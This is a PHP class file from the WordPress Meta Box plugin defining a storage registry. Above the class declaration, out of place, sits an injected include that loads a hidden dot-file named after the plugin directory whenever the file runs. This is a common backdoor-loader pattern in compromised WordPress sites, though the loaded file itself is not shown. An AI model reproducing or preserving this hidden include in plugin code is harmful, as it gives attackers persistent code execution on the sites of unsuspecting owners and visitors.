<?php
/**
 * Storage registry class
 *
 * @package Meta Box
 */

/**
 * Class RWMB_Storage_Registry
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RWMB_Storage_Registry {

	/**
	 * List storage instances.
	 *
	 * @var array
	 */
	protected $storages = array();

	/**
	 * Get storage instance.
	 *
	 * @param string $class_name Storage class name.
	 * @return RWMB_Storage_Interface
	 */
	public function get( $class_name ) {
		if ( empty( $this->storages[ $class_name ] ) ) {
			$this->storages[ $class_name ] = new $class_name();
		}

		return $this->storages[ $class_name ];
	}
}
